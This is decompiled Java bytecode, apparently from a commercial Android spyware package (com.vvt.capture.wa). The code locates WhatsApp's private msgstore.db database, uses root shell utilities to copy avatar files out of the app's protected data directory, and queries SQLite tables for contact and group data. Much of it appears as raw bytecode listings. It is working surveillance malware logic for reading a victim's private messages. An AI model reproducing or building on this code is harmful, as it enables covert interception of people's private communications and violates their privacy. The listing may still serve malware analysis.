    //   74	50	8	arrayOfByte2	byte[]
    //   79	173	9	localObject9	Object
    //   107	10	10	k	int
    //   140	54	11	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   100	105	133	java/lang/Exception
    //   126	130	133	java/lang/Exception
    //   175	180	133	java/lang/Exception
    //   71	74	190	finally
    //   76	79	190	finally
    //   81	86	190	finally
    //   86	89	210	finally
    //   93	98	210	finally
    //   100	105	215	finally
    //   126	130	215	finally
    //   175	180	215	finally
    //   137	140	223	finally
    //   71	74	234	java/lang/Exception
    //   76	79	234	java/lang/Exception
    //   81	86	234	java/lang/Exception
    //   86	89	244	java/lang/Exception
    //   93	98	244	java/lang/Exception
  }
  
  public static byte[] a(String paramString1, boolean paramBoolean, String paramString2, String paramString3)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = paramString1 + ".j";
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = ((StringBuilder)localObject1).append("/data/data/com.whatsapp/files/Avatars");
    Object localObject3 = File.separator;
    localObject3 = (String)localObject3 + (String)localObject2;
    boolean bool1 = false;
    localObject1 = null;
    boolean bool2 = a;
    boolean bool4;
    if ((!bool2) || (paramBoolean))
    {
      boolean bool3 = ShellUtil.b((String)localObject3);
      if (!bool3) {
        break label392;
      }
      bool3 = a;
      if (bool3) {}
      localObject3 = new java/util/ArrayList;
      ((ArrayList)localObject3).<init>();
      ((ArrayList)localObject3).add(localObject2);
      Object localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject4 = ((StringBuilder)localObject4).append(paramString2);
      String str = File.separator;
      localObject4 = ((StringBuilder)localObject4).append(str);
      localObject2 = (String)localObject2;
      bool2 = a;
      if (bool2) {}
      localObject4 = "/data/data/com.whatsapp/files/Avatars";
      ShellUtil.a((String)localObject4, paramString2, (ArrayList)localObject3);
      bool3 = ShellUtil.b((String)localObject2);
      if (bool3)
      {
        ShellUtil.b(paramString3, (String)localObject2);
        localObject1 = a((String)localObject2);
        bool3 = a;
        if (bool3) {}
        ShellUtil.i((String)localObject2);
      }
    }
    else
    {
      int i;
      if (localObject1 != null)
      {
        i = localObject1.length;
        if (i != 0) {}
      }
      else
      {
        bool1 = a;
        if (bool1) {}
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject2 = b(paramString1);
        localObject1 = (String)localObject2 + ".jpg";
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject3 = com.vvt.io.d.h("/sdcard/WhatsApp/Profile Pictures");
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject3 = File.separator;
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject1 = a((String)localObject1);
      }
      if (localObject1 != null)
      {
        i = localObject1.length;
        if (i != 0) {
          break label405;
        }
      }
      bool4 = a;
      if (!bool4) {}
    }
    for (;;)
    {
      return (byte[])localObject1;
      bool4 = b;
      if (!bool4) {
        break;
      }
      break;
      label392:
      bool4 = a;
      if (!bool4) {
        break;
      }
      break;
      label405:
      bool4 = a;
      if (!bool4) {}
    }
  }
  
  public static String[] a()
  {
    int i = 2;
    int j = 1;
    String[] arrayOfString = new String[i];
    Object localObject = new Object[i];
    localObject[0] = "/data/data";
    localObject[j] = "com.whatsapp";
    String str = String.format("%s/%s/databases", (Object[])localObject);
    localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    str = str + "/msgstore.db";
    arrayOfString[0] = str;
    localObject = new Object[i];
    localObject[0] = "/dbdata/databases";
    localObject[j] = "com.whatsapp";
    str = String.format("%s/%s", (Object[])localObject);
    localObject = new java/lang/StringBuilder;
    ((StringBuilder)localObject).<init>();
    str = str + "/msgstore.db";
    arrayOfString[j] = str;
    return arrayOfString;
  }
  
  public static String b(String paramString)
  {
    String str = null;
    if (paramString != null) {
      str = paramString.split("@")[0];
    }
    return str;
  }
  
  public static ArrayList b(String paramString, SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = d(paramString, paramSQLiteDatabase);
    if (localArrayList != null)
    {
      int i = localArrayList.size();
      if (i == 0) {
        localArrayList = c(paramString, paramSQLiteDatabase);
      }
    }
    boolean bool2 = a;
    if (bool2) {}
    return localArrayList;
  }
  
  public static String c(String paramString)
  {
    int i = 0;
    String str = null;
    if (paramString != null)
    {
      i = paramString.lastIndexOf("/") + 1;
      str = paramString.substring(i);
    }
    return str;
  }
  
  /* Error */
  public static ArrayList c(String paramString, SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: new 50	java/util/ArrayList
    //   13: astore 4
    //   15: aload 4
    //   17: invokespecial 51	java/util/ArrayList:<init>	()V
    //   20: aload_1
    //   21: ifnull +279 -> 300
    //   24: ldc_w 631
    //   27: astore 5
    //   29: ldc_w 633
    //   32: astore 6
    //   34: iconst_1
    //   35: istore_3
    //   36: iload_3
    //   37: anewarray 33	java/lang/String
    //   40: astore 7
    //   42: iconst_0
    //   43: istore_3
    //   44: aconst_null
    //   45: astore 8
    //   47: aload 7
    //   49: iconst_0
    //   50: aload_0
    //   51: aastore
    //   52: ldc -52
    //   54: astore 9
    //   56: iconst_0
    //   57: istore 10
    //   59: aconst_null
    //   60: astore 11
    //   62: aload_1
    //   63: astore 8
    //   65: aload_1
    //   66: aload 9
    //   68: aconst_null
    //   69: aload 5
    //   71: aload 7
    //   73: aload 6
    //   75: aconst_null
    //   76: aconst_null
    //   77: invokevirtual 210	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   80: astore 8
    //   82: aload 8
    //   84: ifnull +221 -> 305
    //   87: aload 8
    //   89: invokeinterface 636 1 0
    //   94: istore 12
    //   96: iload 12
    //   98: ifeq +207 -> 305
    //   101: ldc_w 638
    //   104: astore 9
    //   106: aload 8
    //   108: aload 9
    //   110: invokeinterface 220 2 0
    //   115: istore 12
    //   117: aload 8
    //   119: iload 12
    //   121: invokeinterface 642 2 0
    //   126: istore 12
    //   128: ldc_w 644
    //   131: astore 11
    //   133: aload 8
    //   135: aload 11
    //   137: invokeinterface 220 2 0
    //   142: istore 10
    //   144: aload 8
    //   146: iload 10
    //   148: invokeinterface 224 2 0
    //   153: astore 11
    //   155: iconst_4
    //   156: istore 13
    //   158: iload 12
    //   160: iload 13
    //   162: if_icmpne +81 -> 243
    //   165: aload 4
    //   167: aload 11
    //   169: invokevirtual 647	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   172: istore 12
    //   174: iload 12
    //   176: ifne -89 -> 87
    //   179: aload 4
    //   181: aload 11
    //   183: invokevirtual 589	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   186: pop
    //   187: goto -100 -> 87
    //   190: astore 9
    //   192: getstatic 18	com/vvt/capture/wa/removeFromPath/a:removeFromPath	Z
    //   195: istore 12
    //   197: iload 12
    //   199: ifeq +3 -> 202
    //   202: aload 8
    //   204: ifnull +10 -> 214
    //   207: aload 8
    //   209: invokeinterface 241 1 0
    //   214: aload 4
    //   216: invokevirtual 625	java/util/ArrayList:size	()I
    //   219: istore_3
    //   220: iload_3
    //   221: ifle +11 -> 232
    //   224: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   227: istore_3
    //   228: iload_3
    //   229: ifeq +3 -> 232
    //   232: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   235: istore_3
    //   236: iload_3
    //   237: ifeq +3 -> 240
    //   240: aload 4
    //   242: areturn
    //   243: iconst_5
    //   244: istore 13
    //   246: iload 12
    //   248: iload 13
    //   250: if_icmpne -163 -> 87
    //   253: aload 4
    //   255: aload 11
    //   257: invokevirtual 647	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   260: istore 12
    //   262: iload 12
    //   264: ifeq -177 -> 87
    //   267: aload 4
    //   269: aload 11
    //   271: invokevirtual 651	java/util/ArrayList:remove	(Ljava/lang/Object;)Z
    //   274: pop
    //   275: goto -188 -> 87
    //   278: astore 9
    //   280: aload 8
    //   282: astore_2
    //   283: aload 9
    //   285: astore 8
    //   287: aload_2
    //   288: ifnull +9 -> 297
    //   291: aload_2
    //   292: invokeinterface 241 1 0
    //   297: aload 8
    //   299: athrow
    //   300: iconst_0
    //   301: istore_3
    //   302: aconst_null
    //   303: astore 8
    //   305: aload 8
    //   307: ifnull -93 -> 214
    //   310: goto -103 -> 207
    //   313: astore 8
    //   315: goto -28 -> 287
    //   318: astore 8
    //   320: iconst_0
    //   321: istore_3
    //   322: aconst_null
    //   323: astore 8
    //   325: goto -133 -> 192
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	328	0	paramString	String
    //   0	328	1	paramSQLiteDatabase	SQLiteDatabase
    //   1	291	2	localObject1	Object
    //   5	39	3	bool1	boolean
    //   219	2	3	i	int
    //   227	95	3	bool2	boolean
    //   13	255	4	localArrayList	ArrayList
    //   27	43	5	str1	String
    //   32	42	6	str2	String
    //   40	32	7	arrayOfString	String[]
    //   45	261	8	localObject2	Object
    //   313	1	8	localObject3	Object
    //   318	1	8	localException1	Exception
    //   323	1	8	localObject4	Object
    //   54	55	9	str3	String
    //   190	1	9	localException2	Exception
    //   278	6	9	localObject5	Object
    //   57	90	10	j	int
    //   60	210	11	str4	String
    //   94	3	12	bool3	boolean
    //   115	48	12	k	int
    //   172	91	12	m	int
    //   156	95	13	n	int
    // Exception table:
    //   from	to	target	type
    //   87	94	190	java/lang/Exception
    //   108	115	190	java/lang/Exception
    //   119	126	190	java/lang/Exception
    //   135	142	190	java/lang/Exception
    //   146	153	190	java/lang/Exception
    //   167	172	190	java/lang/Exception
    //   181	187	190	java/lang/Exception
    //   255	260	190	java/lang/Exception
    //   269	275	190	java/lang/Exception
    //   87	94	278	finally
    //   108	115	278	finally
    //   119	126	278	finally
    //   135	142	278	finally
    //   146	153	278	finally
    //   167	172	278	finally
    //   181	187	278	finally
    //   192	195	278	finally
    //   255	260	278	finally
    //   269	275	278	finally
    //   36	40	313	finally
    //   50	52	313	finally
    //   76	80	313	finally
    //   36	40	318	java/lang/Exception
    //   50	52	318	java/lang/Exception
    //   76	80	318	java/lang/Exception
  }
  
  /* Error */
  public static ArrayList d(String paramString, SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: new 50	java/util/ArrayList
    //   13: astore 4
    //   15: aload 4
    //   17: invokespecial 51	java/util/ArrayList:<init>	()V
    //   20: aload_1
    //   21: ifnull +204 -> 225
    //   24: ldc_w 653
    //   27: astore 5
    //   29: iconst_1
    //   30: istore_3
    //   31: iload_3
    //   32: anewarray 33	java/lang/String
    //   35: astore 6
    //   37: iconst_0
    //   38: istore_3
    //   39: aconst_null
    //   40: astore 7
    //   42: aload 6
    //   44: iconst_0
    //   45: aload_0
    //   46: aastore
    //   47: ldc_w 655
    //   50: astore 8
    //   52: iconst_0
    //   53: istore 9
    //   55: aload_1
    //   56: astore 7
    //   58: aload_1
    //   59: aload 8
    //   61: aconst_null
    //   62: aload 5
    //   64: aload 6
    //   66: aconst_null
    //   67: aconst_null
    //   68: aconst_null
    //   69: invokevirtual 210	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   72: astore 7
    //   74: aload 7
    //   76: ifnull +154 -> 230
    //   79: aload 7
    //   81: invokeinterface 636 1 0
    //   86: istore 10
    //   88: iload 10
    //   90: ifeq +140 -> 230
    //   93: ldc_w 657
    //   96: astore 8
    //   98: aload 7
    //   100: aload 8
    //   102: invokeinterface 220 2 0
    //   107: istore 10
    //   109: aload 7
    //   111: iload 10
    //   113: invokeinterface 224 2 0
    //   118: astore 8
    //   120: aload 8
    //   122: invokestatic 91	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   125: istore 9
    //   127: iload 9
    //   129: ifne -50 -> 79
    //   132: aload 4
    //   134: aload 8
    //   136: invokevirtual 647	java/util/ArrayList:contains	(Ljava/lang/Object;)Z
    //   139: istore 9
    //   141: iload 9
    //   143: ifne -64 -> 79
    //   146: aload 4
    //   148: aload 8
    //   150: invokevirtual 589	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   153: pop
    //   154: goto -75 -> 79
    //   157: astore 8
    //   159: getstatic 18	com/vvt/capture/wa/removeFromPath/a:removeFromPath	Z
    //   162: istore 10
    //   164: iload 10
    //   166: ifeq +3 -> 169
    //   169: aload 7
    //   171: ifnull +10 -> 181
    //   174: aload 7
    //   176: invokeinterface 241 1 0
    //   181: aload 4
    //   183: invokevirtual 625	java/util/ArrayList:size	()I
    //   186: istore_3
    //   187: iload_3
    //   188: ifle +11 -> 199
    //   191: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   194: istore_3
    //   195: iload_3
    //   196: ifeq +3 -> 199
    //   199: getstatic 13	com/vvt/capture/wa/removeFromPath/a:a	Z
    //   202: istore_3
    //   203: iload_3
    //   204: ifeq +3 -> 207
    //   207: aload 4
    //   209: areturn
    //   210: astore 7
    //   212: aload_2
    //   213: ifnull +9 -> 222
    //   216: aload_2
    //   217: invokeinterface 241 1 0
    //   222: aload 7
    //   224: athrow
    //   225: iconst_0
    //   226: istore_3
    //   227: aconst_null
    //   228: astore 7
    //   230: aload 7
    //   232: ifnull -51 -> 181
    //   235: goto -61 -> 174
    //   238: astore 8
    //   240: aload 7
    //   242: astore_2
    //   243: aload 8
    //   245: astore 7
    //   247: goto -35 -> 212
    //   250: astore 7
    //   252: iconst_0
    //   253: istore_3
    //   254: aconst_null
    //   255: astore 7
    //   257: goto -98 -> 159
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	260	0	paramString	String
    //   0	260	1	paramSQLiteDatabase	SQLiteDatabase
    //   1	242	2	localObject1	Object
    //   5	34	3	bool1	boolean
    //   186	2	3	i	int
    //   194	60	3	bool2	boolean
    //   13	195	4	localArrayList	ArrayList
    //   27	36	5	str1	String
    //   35	30	6	arrayOfString	String[]
    //   40	135	7	localObject2	Object
    //   210	13	7	localObject3	Object
    //   228	18	7	localObject4	Object
    //   250	1	7	localException1	Exception
    //   255	1	7	localObject5	Object
    //   50	99	8	str2	String
    //   157	1	8	localException2	Exception
    //   238	6	8	localObject6	Object
    //   53	89	9	bool3	boolean
    //   86	3	10	bool4	boolean
    //   107	5	10	j	int
    //   162	3	10	bool5	boolean
    // Exception table:
    //   from	to	target	type
    //   79	86	157	java/lang/Exception
    //   100	107	157	java/lang/Exception
    //   111	118	157	java/lang/Exception
    //   120	125	157	java/lang/Exception
    //   134	139	157	java/lang/Exception
    //   148	154	157	java/lang/Exception
    //   31	35	210	finally
    //   45	47	210	finally
    //   68	72	210	finally
    //   79	86	238	finally
    //   100	107	238	finally
    //   111	118	238	finally
    //   120	125	238	finally
    //   134	139	238	finally
    //   148	154	238	finally
    //   159	162	238	finally
    //   31	35	250	java/lang/Exception
    //   45	47	250	java/lang/Exception
    //   68	72	250	java/lang/Exception
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */